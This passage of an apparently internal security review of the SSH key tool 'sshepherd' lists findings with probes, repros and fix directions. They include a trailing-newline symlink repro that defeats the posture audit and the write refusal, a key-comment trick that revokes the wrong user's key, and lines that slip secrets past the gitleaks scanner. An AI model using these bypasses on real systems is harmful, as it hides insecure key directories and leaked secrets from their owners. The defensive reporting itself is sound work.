Probe test in own worktree: lockRemoveCmd(config.Server{Name:"hopped", User:"deploy", Host:"10.9.0.5", Port:22, Via:"bastion"}, "~/.ssh/authorized_keys") printed `ssh -p 22 deploy@10.9.0.5 'p="${HOME:?}"/'\''.ssh/authorized_keys'\''; rm -f -- "$p.sshepherd.lock/owner"; rmdir -- "$p.sshepherd.lock"'` -- no -J, no mention of the bastion. lockRemoveCmd's signature takes no route (no cfg.Chain), while the host-key hint for the same kind of server is bastion-aware.
~~~~

**Repro:**

~~~~text
Manifest with a via: server (e.g. integration container C behind A); plant ~/.ssh/authorized_keys.sshepherd.lock on C; run apply. The refusal prints `ssh -p 22 user@<C's internal address> '...'`; pasting it on the operator machine times out (C is on an --internal network) or, if that address exists on the operator's LAN, reaches another host.
~~~~

**Impact:** The only documented way to clear a stale lock on a bastion-routed server does not work as printed; the operator must hand-build the -J route. Worst case it targets a different host (strict host-key checking would normally stop it).

**Fix direction:** Pass the route (cfg.Chain) into lockedErrorFor and build the command like keyscanCompareCmd: `ssh -J <outer hops> ...` through hopWord-checked bastions, or an 'on bastion NAME: ssh ...' form when a hop is not a plain word; add a TestLockRemoveCmd row for a via server.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
internal/sshwrite/lock.go:112-122 `func lockRemoveCmd(srv config.Server, path string) string { target := srv.User + "@" + srv.Host ... return fmt.Sprintf("ssh -p %d %s %s", srv.Port, word, ...)`; lock.go:95 `func lockedErrorFor(srv config.Server, path, stdout string)` (no route); sshwrite.go:509 only caller. Contrast sshconn/hostkey.go keyscanCompareCmd(presented, srv, route) with -J / 'on bastion'. Probe test in own worktree (go test -run TestProbeG017 ./internal/sshwrite/) with config.Server{Name:"hopped",User:"deploy",Host:"10.9.0.5",Port:22,Via:"bastion"} printed: ssh -p 22 deploy@10.9.0.5 'p="${HOME:?}"/'\''.ssh/authorized_keys'\''; rm -f -- "$p.sshepherd.lock/owner"; rmdir -- "$p.sshepherd.lock"' -- no -J, no bastion; the full LockedError message carries the same command.
~~~~

</details>

#### G018 [medium] A directory name ending in a newline makes the StrictModes walks check a decoy: audit's posture probe reports clean (a world-writable dir audits exit 0, not 2) and the write's exit-48 refusal is bypassed

- **Status:** CONFIRMED
- **Lens(es):** gap-remote-posture-lock-probe-header (raw ids: K4-3)
- **Location:** internal/sshconn/posture.go:30-31 (`q=$(dirname "$q")`, `q=$(cd -P "$d" && pwd -P)` -- command substitution strips trailing newlines) and :44-46/:61-72; shared by internal/sshwrite/sshwrite.go:121 (ancestorCheck) and :182-183; spec docs/superpowers/specs/2026-11-08-audit-trust-posture-design.md:261 ('A path containing a newline therefore breaks the grammar and fails closed')
- **Verifier votes:** single: reproduced (sev low)

**Evidence** (verbatim from the finding):

~~~~text
Setup: ~/.ssh -> "$HOME/real<NL>" (mode 770, holds authorized_keys) plus a decoy "$HOME/real" (700). Generated PostureCmdFor("~/.ssh/authorized_keys"): control (~/.ssh -> $HOME/real, 770) prints `SSHEPHERD-POSTURE drwxrwx--- 501 group_writable .../real`; trailing-newline case prints nothing, rc=0, under /bin/sh, dash, and busybox ash (alpine). With 0777: control prints group_writable + world_writable; trailing-newline case prints nothing. Write path, writeCmdFor("~/a/b/ak") with ~/a -> "$HOME/x<NL>" (770) and decoy $HOME/x: control exits 48 (no file); trailing-newline case exits 0 and writes ak, under dash, bash --posix, sh and busybox. FinishPosture maps empty stdout to no issues (posture.go:104-105).
~~~~

**Repro:**

~~~~text
As the account user: nl=$(printf '\n.'); nl=${nl%.}; mkdir "$HOME/real$nl" "$HOME/real"; chmod 777 "$HOME/real$nl"; mv ~/.ssh/authorized_keys "$HOME/real$nl"/; rmdir ~/.ssh; ln -s "$HOME/real$nl" ~/.ssh. Then sshepherd audit: posture clean and the server compliant (exit 0), although its key directory is world-writable (critical, exit 2) and sshd with StrictModes yes ignores the file.
~~~~

**Impact:** The posture class (D14: world-writable = critical) and the write refusal can be silently defeated, and the spec's fail-closed claim for newline paths is false for a trailing newline; with StrictModes yes, sshd ignores the file while audit says compliant. Mitigation: creating the link needs write access to the containing directory, i.e. the account user or root (the spec already says a compromised server can lie).

**Fix direction:** Never take a path from $(...) bare: use a sentinel (q=$(cd -P "$d" && pwd -P && echo .); q=${q%??}) for both cd -P and dirname, or fail closed (exit 1 / malformed record) whenever a resolved path contains a newline; pin with a unit row in the posture and ownerChecks matrices.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
Probe (worktree 9722c42): a test wrote sshconn.PostureCmdFor("~/.ssh/authorized_keys") and writeCmdFor("~/a/b/ak", SnapshotOf(true,nil), 4) to files, then ran them with a fake HOME under /bin/sh, /bin/bash and /bin/dash. Results were identical in all three. Control (~/.ssh -> $HOME/real, 777): posture rc=0 out=<SSHEPHERD-POSTURE drwxrwxrwx 501 group_writable .../real\nSSHEPHERD-POSTURE drwxrwxrwx 501 world_writable .../real>, and write rc=48 ak-written=no. Trailing-newline case (~/.ssh -> "$HOME/real\n" 777, decoy $HOME/real 700): posture rc=0 out=<> and write rc=0 ak-written=yes. The 770 rows match: the control gives group_writable / 48, and the newline case gives empty output / 0. Without the decoy, posture prints 'ls: .../real: No such file' and a malformed record, so it fails closed. Code: posture.go:31 `q=$(cd -P "$d" && pwd -P) || exit 1; while :; do set -- $(ls -ldn "$q")`; posture.go:104-105 `if out == "" { return nil, false, nil }`.
~~~~

</details>

#### G020 [medium] A pasted key line whose comment holds ' SHA256:&lt;fp>' is taken as that fingerprint: revoke/rotate act on a different key and the pasted key stays

- **Status:** CONFIRMED
- **Lens(es):** gap-revoke-rotate-cmd-and-keyarg (raw ids: K6-3)
- **Location:** cmd/sshepherd/keyarg.go:80-85 (step 2 `strings.Contains(arg, " SHA256:")` runs before the key-line step at :88)
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
Probe with alice's key line plus comment `alice new laptop, replaces SHA256:7bdz…` (bob's fingerprint): `sshepherd revoke --config m.yaml --no-apply --dry-run --key "$ALINE"` -> `manifest edit: remove key SHA256:7bdzKYply0b032iohHrk23T5lHJnAdL4QeAW4RyyNi4 from bob`, exit 0. With a comment `old SHA256:AAAA…A` (43 A's): `manifest edit: record revoked key SHA256:AAAA… (no user has it; no server is written) — no servers affected`, exit 0, and alice's key is untouched. `rotate alice --new "<dave line> dave from SHA256:…"` -> `--new …: a fingerprint carries no key`.
~~~~

**Repro:**

~~~~text
sshepherd revoke --key "ssh-ed25519 AAAA…(alice) alice laptop SHA256:<bob's fp>" --yes -> bob's key removed and tombstoned; alice's key still installed everywhere; exit 0. A pasted line whose comment holds any well-formed SHA256 token records that token as a D1b unowned tombstone and exits 0.
~~~~

**Impact:** revoke is the lost-laptop path. Under --yes, nothing stops it from revoking the wrong user's key (that user is locked out) while the intended key stays live, and the run exits 0. Only the header's fingerprint shows the mismatch. The --key file path is not affected, because a .pub is parsed as a line.

**Fix direction:** Check whether the argument starts with a key type or option (looksLikeKeyLine minus the whitespace rule) before step 2, or limit step 2 to the `ssh-keygen -l` shape (`^\d+ SHA256:\S+ .* \([A-Z0-9-]+\)$`). Add a classification test for a key line whose comment holds a SHA256 token, and a FuzzKeyArg oracle that a parseable key line classifies as its own fingerprint.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Probe test (worktree) classifyKeyArg(roleKey, testkeys.Line(1)+" alice new laptop, replaces "+bobFP): alice=SHA256:fe85Jk... bob=SHA256:4A9jyZ... got=SHA256:4A9jyZ... key=false err=<nil>. CLI (built from 9722c42): `sshepherd revoke --config m.yaml --no-apply --dry-run --key "$ALINE"` -> `manifest edit: remove key SHA256:kmPRWUtttBzdOpOzn06EneoGrG778YkTGGN8eJe3Zcg from bob — 1 server affected`, exit=0. With comment `old SHA256:AAAA...A` (43) -> `manifest edit: record revoked key SHA256:AAAA... (no user has it; no server is written) — no servers affected`, exit=0. Code: keyarg.go:80 `case strings.Contains(arg, " SHA256:"):` precedes :88 `case looksLikeKeyLine(arg):`.
~~~~

</details>

## 3. Plausible findings

None. Every critical, high and medium finding was either reproduced by its verifier(s) or refuted. Five low findings were marked PLAUSIBLE by their own finder (F030, F036, F040, G029, G031). They are listed in section 4 with the other low findings and are tagged there.

## 4. Low findings (UNVERIFIED)

These were not checked by a verifier in this review. The "finder's confidence" is the finder's own claim. Three were looked at again in the gap round (K8): F025 and F037 were reproduced there and suggested for medium; F005 is in section 2.

#### F024 [low] An unrecorded host that serves a host certificate is reported host\_key (not host\_key\_unknown) and gets no fingerprint/keyscan hint

- **Status:** UNVERIFIED
- **Lens(es):** ssh-crypto (raw ids: L01-3)
- **Location:** internal/sshconn/knownhosts.go:118-128 (HostKeyAlgorithms returns nil), internal/sshconn/hostkey.go:44-55
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
HostKeyAlgorithms' doc: 'A host with no entries at all gets nil (x/crypto's defaults) so verification can name the presented key in its "not in known_hosts" hint.' x/crypto's default order puts certificate algorithms first, so a host with an sshd HostCertificate presents the certificate, CertChecker returns 'ssh: no authorities for hostname', and hostKeyHint classifies it host_key. Probe (worktree, sshtest server with [certSigner, plain], empty known_hosts): `RESULT kind=host_key alert=false ... ssh: no authorities for hostname: 127.0.0.1:55668 hint="the host presented a certificate but no @cert-authority line in ... vouches for it here; record the host's plain key or its CA (verified out of band)"`; control (plain only): `kind=host_key_unknown ... hint="host is not in ...; verify the presented fingerprint out of band (on the server console: ssh-keygen -lf ...), then compare before recording: ssh-keyscan -t ed25519 -p ... | ssh-keygen -lf -"`.
~~~~

**Impact:** JSON error\_kind says host\_key instead of host\_key\_unknown for a brand-new host, and the operator loses the out-of-band console/keyscan comparison hint exactly when onboarding a host; still fails closed (no TOFU).

**Fix direction:** For a host with no entries, offer the plain algorithms only (or plain first), so the presented plain key reaches the host\_key\_unknown branch and its hint.

#### F025 [low] Option table lacks names sshd accepts (touch-required, no-verify-required): a working operator line audits as CRITICAL 'sshd ignores every line', adopt refuses the key

- **Status:** UNVERIFIED
- **Lens(es):** injection (raw ids: L02-4)
- **Location:** internal/authkeys/options.go:54,65 (only no-touch-required and verify-required listed; sshd's opt\_flag accepts both polarities of touch-required and verify-required)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Real sshd (OpenSSH_10.5p1): `touch-required ssh-ed25519 ...` -> LOGIN_OK; `no-verify-required ...` -> LOGIN_OK; `no-x11-forwarding,touch-required ...` -> LOGIN_OK; controls `no-restrict`, `no-cert-authority`, `bogus-opt` -> Permission denied. Probe: IgnoredBySSHD("touch-required") = 'option "touch-required" is not a recognized authorized_keys option'; audit with op's line `touch-required <k1>` -> 'exit=2 reasons=[operator_cannot_log_in] ‼ op ... present but CANNOT LOG IN (CRITICAL: operator key; sshd ignores every line holding it)'.
~~~~

**Impact:** False critical pages and an adopt that drops a key which logs in today; the manifest also cannot express these options. The table is documented as sshd's meaning of every option, which it is not.

**Fix direction:** Add touch-required (restricts) and no-verify-required (neutral) to the table, and pin the table against sshd's opt\_flag list with a real-sshd integration matrix.

**Gap-round check K8-1** (medium, CONFIRMED): F025 re-rated low -> medium (CONFIRMED on real sshd): touch-required / no-verify-required lines that log in are graded CRITICAL operator\_cannot\_log\_in (exit 2), adopt treats them as dead, and the manifest cannot express them

~~~~text
Real sshd, local OpenSSH_10.5p1 run as a non-root user on 127.0.0.1:42918 with AuthorizedKeysFile pointing at a scratch file, ssh -i key 'echo LOGIN_OK': '[touch-required ] -> LOGIN_OK', '[no-verify-required ] -> LOGIN_OK', '[] -> LOGIN_OK'; controls '[no-restrict ] -> Permission denied (publickey).', '[bogus-opt ] -> Permission denied (publickey).'. Probe TestK8F025 (internal/audit, existing trustConfig/runOne helpers, operator key op on the server as '<prefix><op>'): '"touch-required " IgnoredBySSHD=option "touch-required" is not a recognized authorized_keys option reason="ignored" status=critical reasons=[operator_cannot_log_in]'; '"no-verify-required " ... reason="ignored" status=critical reasons=[operator_cannot_log_in]'; controls '"no-touch-required " IgnoredBySSHD=<nil> ... status=drift reasons=[]', '"verify-required " IgnoredBySSHD=<nil> ... status=drift'. sshd's auth-options.c parses touch-required and verify-required with opt_flag(name, allow_negate=1), so both polarities are valid; the table lists exactly one polarity of each. adopt uses the same IgnoredBySSHD (adopt.go:241,245), so such a key becomes an Issue ('sshd ignores this line', the shape pinned by TestBuildBadOptionLineIsAnIssue), never a user or extension. Revoked/unauthorized detection does not use IgnoredBySSHD (only cannotLogIn and adopt call it), so this is a false positive, not a hidden revoked key.
~~~~

#### F026 [low] A pending ssh-agent signature ignores Ctrl-C and the per-server timeout; apply's write connect waits for the 2-minute session budget

- **Status:** UNVERIFIED
- **Lens(es):** concurrency (raw ids: L04-2)
- **Location:** internal/sshconn/credentials.go:67 (also connect.go:206-210, internal/sshwrite/sshwrite.go:476-477)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
dialAgent bounds the agent socket only by a deadline: `_ = conn.SetDeadline(dl)` (credentials.go:67). Nothing closes the agent connection when ctx ends. ConnectWith's cancel watcher closes the TCP socket (connect.go:256), but x/crypto's client auth is blocked inside the agent's Sign, which reads from the agent socket and not from TCP. In connectForWrite, connCtx's deadline is the 2-minute budget (`deadline := w.clock().Add(budget)`; `context.WithDeadline(context.WithoutCancel(ctx), deadline)`), so the agent socket gets that deadline, and the 30 s per-server ctx only reaches the TCP socket. Probe 1 (sshconn TestL04CancelDoesNotEndConnectWhileAgentSigns, an agent whose Sign blocks, ctx 6 s, cancel at 300 ms): `Connect returned after 6s (cancel at 300ms): err=ssh deploy@127.0.0.1:56299: ssh: handshake failed: agent: client error: read unix ->...a.sock: i/o timeout kind=canceled`. Probe 2 (sshwrite TestL04WriteConnectAgentSignIgnoresPerServerTimeout, per-server ctx 500 ms, SessionBudget 6 s): `Apply returned after 6s (per-server timeout 500ms, budget 6s): kind=canceled ...` / `--- FAIL ... (6.00s)`.
~~~~

**Impact:** Operators who use FIDO or sk keys, PIV keys in the agent, or `ssh-add -c` can see a Ctrl-C ignored until the per-server deadline (30 s on reads), or until 2 minutes on apply/revoke/rotate write connects, where the 30 s per-server timeout does not bound the connect at all. A second Ctrl-C exits 130 instead of the documented 3 for a run that wrote nothing. No safety impact.

**Fix direction:** Close the agent connection when ctx ends: an AfterFunc(ctx, conn.Close) in dialAgent/Signers, released with the closer. connectForWrite then also needs connCtx to carry the caller's per-server deadline, not only the budget, or the agent watcher should follow the caller's ctx while the handshake runs.

#### F027 [low] operator\_grant\_redundant says an operator's literal/@tag entry 'adds nothing' when that entry's options: is creating a restriction conflict

- **Status:** UNVERIFIED
- **Lens(es):** access-model (raw ids: L05-2)
- **Location:** internal/config/protected.go:33
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Probe TestL05Matrix case 'fleet-wide op + own literal entry with options' (access: - {user: op, servers: [s1], options: [no-pty]}, op operator: true): output 'CONFLICT restriction_conflict [s1]: user "op": server "s1" is granted by its operator grant with no options and by access[0] with [no-pty]; ...' and in the same load 'WARN operator_grant_redundant: operator "op": this access entry adds nothing; operator: true still grants every server'. warnRedundantGrant only checks c.fleetWide[a.User], never len(a.Options).
~~~~

**Impact:** The warning tells the operator the entry is inert while it is the cause of a critical audit (exit 2) and an apply refusal on s1; following the warning's implication (it is harmless) leaves the server refused. The intended way to restrict an operator (its own servers: \["\*"] entry with options:) is not suggested.

**Fix direction:** When the redundant entry carries options:, word the warning (or skip it in favour of the conflict) to say grant options cannot restrict the implicit operator grant and point to an own servers: \["\*"] entry with options:.

#### F028 [low] README revocation-memory audit JSON sample is stale against its golden (critical\_reasons missing), and no test pins README samples to goldens

- **Status:** UNVERIFIED
- **Lens(es):** contract-docs (raw ids: L06-2)
- **Location:** README.md:1293-1433 (```json block after 'Revocation memory adds optional fields'); internal/audit/testdata/report\_revoked.golden.json
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
`awk 'NR>1294{if(/^```/)exit; print}' README.md > r.json; diff r.json internal/audit/testdata/report_revoked.golden.json` -> `84c84,88 <  "header_serial": 7 --- >  "header_serial": 7, > "critical_reasons": [ "policy_conflict", "revoked_key" ]` (same at 129c133,137). The golden gained critical_reasons in 0d91358 (P09 audit trust), and the README block was never re-copied. A scan of every README fenced block against every testdata golden found this one full-document JSON sample that matches no golden. The other near-misses are deliberate excerpts. cmd/sshepherd/help_readme_test.go pins only the flag tables and the help footers.
~~~~

**Impact:** The README shows two critical servers without the critical\_reasons field that the real report always carries on a critical server. This breaks the CLAUDE.md rule that sample output must be real. Nothing catches the next renderer change either.

**Fix direction:** Re-copy the block from report\_revoked.golden.json. Add a test that every README JSON/console sample either occurs byte-for-byte in a golden or is marked as an excerpt (or generated).

#### F029 [low] cobra's default `completion` command ships undocumented and without --json

- **Status:** UNVERIFIED
- **Lens(es):** contract-docs (raw ids: L06-3)
- **Location:** cmd/sshepherd/run.go:276-339 (newRootCmd: no CompletionOptions); README.md:832-856 (Commands)
- **Finder's confidence:** CONFIRMED (not verified in this review)
- **Owner decision:** yes: keep the built-in `completion` command (document it in README and exempt it from the --json rule) or disable it?

**Evidence** (verbatim from the finding):

~~~~text
`sshepherd --help` lists `completion  Generate the autocompletion script for the specified shell`. `sshepherd completion --json` -> `error: unknown flag: --json`, exit 3. `grep -n completion README.md` -> no match. `grep -n CompletionOptions cmd/sshepherd/*.go` -> no match. TestHelpMatchesREADMETables and the help goldens cover only the seven named commands.
~~~~

**Impact:** The shipped CLI has a subcommand that the README (the user front door) never mentions. It also breaks the owner rule that every command offers --json, and no test covers its contract.

**Fix direction:** Either disable it (root.CompletionOptions.DisableDefaultCmd) or document it in README Commands as a shell helper exempt from the --json rule.

#### F030 [low] adopt's exit-3 footer and the README exit table list a refusal (adding a restriction conflict) that README's adopt section says cannot happen

- **Status:** UNVERIFIED
- **Lens(es):** contract-docs (raw ids: L06-4)
- **Location:** cmd/sshepherd/run.go:236-244 (exitCodesAdopt); README.md:3154, README.md:90 vs README.md:1784-1787
- **Finder's confidence:** PLAUSIBLE (not verified in this review)
- **Owner decision:** yes: should adopt's documented exit-3 causes keep the defensive 'add a restriction conflict' refusal (and README:1785 be softened), or should it be dropped from the footer and exit table as unreachable for adopt?

**Evidence** (verbatim from the finding):

~~~~text
exitCodesAdopt: "3 ... a manifest that would keep a revoked-key or revoked-access conflict, or add a weak key or a restriction conflict". README.md:3154: "`adopt` and `import --merge` also exit `3` when the save would add a restriction conflict". README.md:1785: "A restriction conflict already in the manifest does not stop the save, and adopt cannot add one: it adds no server, and the access it extends reaches only servers where the user had no grant". Code reading supports 1785: adopt adds no servers, and an extension is a new literal `user:` entry only where Covers(user, server) is false. Blocked or tombstoned pairs are skipped by ownerSkip. So a clash needs a second source on a pair that had none. import --merge can reach it, because it adds servers that two '*' sources then both cover.
~~~~

**Impact:** The docs contradict each other on an exit-code cause. This is the pattern seen twice before in this project: a refusal is documented that the code path cannot produce for that command. Users and monitoring authors cannot tell which statement is true.

**Fix direction:** Pick one statement. Either drop 'or a restriction conflict' from adopt's footer, README:90 and README:3154, keeping conflictRefusal as a silent guard, or soften README:1785 if a reachable path exists.

#### F031 [low] RemoteSnippet's rune cap is not pinned for whitespace by unit tests or seeds, and FuzzRemoteSnippet's allow-list oracle is tautological

- **Status:** UNVERIFIED
- **Lens(es):** test-quality (raw ids: L07-2)
- **Location:** internal/sanitize/sanitize.go:75 (n += need), :39 (snippetRune); internal/sanitize/truncate\_test.go:41-53
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Mutant S10 `n += need` -> `n++` (spaces stop counting toward MaxSnippet, output can reach ~511 runes): SURVIVED `go test -count=1 ./internal/sanitize` (all unit tests and the 16 committed FuzzRemoteSnippet seeds). Only a real fuzz run catches it: `go test -run '^$' -fuzz '^FuzzRemoteSnippet$' -fuzztime 30s` -> `truncate_test.go:47: over cap: 257 runes` (found from the shared GOCACHE corpus, not the repo seeds). Mutant S5 `r <= 0x24f` -> `r <= 0x2ff` (IPA/modifier letters allowed): SURVIVED unit tests AND 30 s of fuzzing (`PASS ok ... 30.422s`), because the fuzz oracle checks `!snippetRune(r)` — the function under test.
~~~~

**Impact:** The SEC-8 bound (a hostile server cannot pad an error line past MaxSnippet runes) is enforced in PRs only by luck of the local fuzz cache; the daily CI fuzz may catch it later. The allow-list boundary can widen silently. Bounded (at most about 2x the cap), hence low.

**Fix direction:** Add a unit row with many single spaces between letters (e.g. strings.Repeat("a ", 300)) asserting rune count &lt;= MaxSnippet+len(truncMark), commit that input as a FuzzRemoteSnippet seed, and give the fuzz oracle an independent allow-list (literal ranges) instead of calling snippetRune.

#### F032 [low] S7 plan's mutation command does not select the expected killer of mutant W10 (same class as the Settings/Setting regex miss)

- **Status:** UNVERIFIED
- **Lens(es):** test-quality (raw ids: L07-3)
- **Location:** docs/superpowers/plans/2026-11-10-p10-s7-restrictions.md:2527 (command) and :2540 (W10 row)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Command: `go test ./internal/apply ./cmd/sshepherd -run 'NothingCanLand|Clash|Restriction|GrantOptions|GrantRestriction|AffectedFollows|RewriteFlags|GrantCommand|SaveRule|ImportMerge|AdoptSaves|FromServerClears|RotateKeepsGrantOptions'`; row: `| W10 | exitCodesWrite keeps "keep a policy conflict" (help text) | TestHelpGolden (...), TestHelpExamplesAndExitCodes ... |`. Neither TestHelpGolden nor TestHelpExamplesAndExitCodes matches the regex (checked with a script over every mutation table in docs/superpowers/plans/*.md against `go test -list`; this is the only miss among the 5 tables that carry a -run command). Applying that W10 mutant to cmd/sshepherd/run.go and running the plan's exact command: `X1-planregex SURVIVED`; running the whole package: `X1 KILLED --- FAIL: TestHelpGolden`. No commit message records a W10 result.
~~~~

**Impact:** A mutation run executed as written reports W10 as surviving (or a hurried run mis-records it as killed by a test that never ran). The code itself is covered (TestHelpGolden kills it in a full run), so only the plan's evidence is wrong.

**Fix direction:** Add `|Help` to the S7 Task 13 regex (or run W10 without -run), and keep a small checker that verifies each plan mutation table's regex selects its cited killers.

#### F033 [low] keysOn's documented 'first grant source decides' rule under a restriction clash is unpinned

- **Status:** UNVERIFIED
- **Lens(es):** test-quality (raw ids: L07-4)
- **Location:** internal/config/restrict.go:120
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Mutant R8 `if len(src) == 0 || len(src[0].options) == 0 {` -> `if len(src) == 0 || len(src[len(src)-1].options) == 0 {` SURVIVED `go test -count=1 ./internal/config` (TestKeysOnNeverSharesOptions, TestGrantOptionsRenderPerServer and FuzzLoad's checkGrantOptions oracle only check pairs whose sources agree). The doc comment says: 'then the first source still decides, so DesiredFor stays deterministic'.
~~~~

**Impact:** Under a clash (first source with options, a later one without) DesiredFor silently renders the key unrestricted. Apply refuses clashed servers and audit skips their options comparison, so today the effect is limited to any consumer that reads DesiredFor on a clashed pair; the stated determinism contract is not enforced.

**Fix direction:** Add a config test with a clashed pair (access\[0] with options, access\[1] without, same server) asserting DesiredFor carries access\[0]'s options.

#### F034 [low] exitFor turns exit code 3 (and any unknown code) into success; validate stays correct only because a second, parallel switch returns its errors

- **Status:** UNVERIFIED
- **Lens(es):** architecture (raw ids: L08-2)
- **Location:** cmd/sshepherd/editrun.go:412
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
editrun.go:412-420 `func exitFor(code int) error { switch code { case 2: return errCriticalDrift; case 1: return errNonCompliant }; return nil }`. validate.go:175 computes `code := validateExit(...)` (which can be 3), and validate.go:199-206 decides the returned error with a separate switch (`case len(conflicts) > 0` / `case knownErr != nil` / `default: return exitFor(code)`). Probe: `exitFor(3) -> err=<nil> -> process exit 0`. Mutant (drop validate.go's `case knownErr != nil: return knownErr`): TestValidateBadKnownHosts and TestValidateJSONDefaultKnownHostsLoadFailure fail with `exit = 0`, while the JSON document already says exit_code 3.
~~~~

**Impact:** Any future code-3 condition added to validateExit (or any caller passing 3) without a matching branch in the second switch exits 0 while the JSON says 3. A tool error then reads as success. The tests pin today's two code-3 paths, but the helper does not fail closed.

**Fix direction:** Make exitFor total: map 3 (and any unexpected value) to a tool error, or panic on an unknown code. Better, have validate derive its error and its exit from one switch.

#### F035 [low] The hostile-rune rule exists in four copies, and they already disagree on U+2028/U+2029

- **Status:** UNVERIFIED
- **Lens(es):** architecture (raw ids: L08-3)
- **Location:** internal/authkeys/authkeys.go:119
- **Finder's confidence:** CONFIRMED (not verified in this review)
- **Owner decision:** yes: should remote-text sanitizing (sanitize.Remote, clog) also drop U+2028/U+2029 the way manifest validation (IsUnsafeRune) does, or keep them, with a comment saying why the two differ?

**Evidence** (verbatim from the finding):

~~~~text
Byte-identical copy of sanitize.Remote: authkeys.go:119-125 `func stripControl(s string) string { return strings.Map(func(r rune) rune { if (unicode.IsControl(r) || unicode.Is(unicode.Cf, r)) && r != '\n' && r != '\t' { return -1 } ...`. A third copy is clog/sanitize.go:39-41 `dropRune`. A fourth, stricter rule is authkeys.go:133-134 `IsUnsafeRune: unicode.IsControl(r) || unicode.In(r, unicode.Cf, unicode.Zl, unicode.Zp)`, whose doc says U+2028/2029 are 'rendered as a line break' by some terminals. The comments in sanitize.go and sshconn.go:97 ask maintainers to 'keep the two in mind together when changing either'. Probe: `U+2028 IsUnsafeRune=true sanitize.Remote keeps=true stripControl keeps=true` (same for U+2029). U+202E and U+009B are dropped by all of them.
~~~~

**Impact:** There is no single answer to 'which runes are hostile'. Manifest fields reject Zl/Zp, but remote text passes through sanitize.Remote and clog with Zl/Zp intact. No exploitable path was found: JSON escapes U+2028/2029 and the text report quotes or Fields-splits remote comments. A fix to one copy, though, leaves the others behind, and the comments push that sync onto humans.

**Fix direction:** Keep one predicate in the stdlib leaf internal/sanitize, decide whether it includes Zl/Zp, and have authkeys (stripControl, IsUnsafeRune) and clog call it, with the log path's newline-to-space step on top. Delete the verbatim copy in authkeys.

#### F036 [low] Server target identity and the OP7 one-route rule are coded twice (config load and import --merge), kept in sync only by a comment

- **Status:** UNVERIFIED
- **Lens(es):** architecture (raw ids: L08-4)
- **Location:** internal/reconcile/reconcile.go:554
- **Finder's confidence:** PLAUSIBLE (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
reconcile.go:554-576 `// defaultAuthorizedKeysFile ... it must equal config's default so target equality matches config validation` / `const defaultAuthorizedKeysFile = "~/.ssh/authorized_keys"` / `type target struct{host, port, user, path}` / `targetOf(...)` (lower-cases host, defaults port 22 and path). config.go:296 `const defaultAuthorizedKeysFile = "~/.ssh/authorized_keys"` plus its own `type target` and `claimAddress` (config.go:343-371, same normalization, same address-route rule). sshconn.go:21 has a third `DefaultAuthorizedKeysPath`. No test references both targetOf and claimAddress (grep over *_test.go finds neither name).
~~~~

**Impact:** A change to target equality (path canonicalization, host\_key\_alias, which is on hold) must be made twice. If it is not, import --merge fails with a load error instead of dropping the duplicate with its warning. It fails closed, so the cost is maintenance, not safety.

**Fix direction:** Export one target constructor and comparison from config (for example config.TargetOf / config.Server.Target) and have reconcile and sshconn's default path use it.

#### F037 [low] gitleaks fingerprint allowlist uses regexTarget=line, so any secret sharing a line with a SHA256 fingerprint is suppressed

- **Status:** UNVERIFIED
- **Lens(es):** supply-chain (raw ids: L09-5)
- **Location:** .gitleaks.toml:9-12 (\[\[allowlists]] regexTarget = "line", regexes = \['''SHA256:\[A-Za-z0-9+/]{43}'''])
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Probe with gitleaks v8.30.1 (go version -m: github.com/zricethezav/gitleaks/v8 v8.30.1) and the repo's .gitleaks.toml: file a/leak.json '{"token":"ghp_<36 chars>"}' -> exit 1, 'leaks found: 1'; file b/leak.json '{"fingerprint":"SHA256:AAAA...(43)","token":"ghp_<same>"}' -> exit 0, 'no leaks found'. The config comment claims 'Private keys and real secrets remain fully covered.'
~~~~

**Impact:** This repo's own output (audit/adopt reports, manifests, logs) puts fingerprints on lines. A token or secret pasted onto such a line (a one-line JSON or log fixture, a YAML line with an inline comment) passes the pre-commit hook, make secrets and both history scans.

**Fix direction:** Target the allowlist at the match (regexTarget = "match") so only the generic-api-key finding on the fingerprint itself is dropped, or scope it to the generic-api-key rule ID.

**Gap-round check K8-2** (medium, CONFIRMED): F037 re-rated low -> medium (CONFIRMED, wider than reported): the line-targeted fingerprint allowlist also suppresses a private key, which the config comment says stays 'fully covered', and GitHub's non-provider patterns (which would catch private keys) are off

~~~~text
gitleaks (/Users/javad/go/bin/gitleaks) with the repo's .gitleaks.toml, each case in its own directory: (a) '{"token":"ghp_<36 random alnum>"}' -> exit=1 'leaks found: 1'; (b) the same line plus '"fingerprint":"SHA256:AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8"' -> exit=0 'no leaks found'; (d) 'aws_access_key_id = AKIA<16>' -> exit=1 'leaks found: 1'; (c) the same AWS line ending '# key for SHA256:...' -> exit=0 'no leaks found'; (e) a one-line JSON '{"private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\n..."}' holding a fresh ssh-keygen ed25519 private key -> exit=1 'leaks found: 1'; (f) the same JSON with a 'fingerprint' field before it -> exit=0 'no leaks found'. The map (scout's gh api read) records secret_scanning non-provider patterns disabled, so GitHub push protection does not cover a private key either. The same config drives the pre-commit 'gitleaks git --staged', make secrets (in make check) and both history scans.
~~~~

#### F038 [low] Release binaries ship with no SBOM and no signed build provenance; only the image is attested

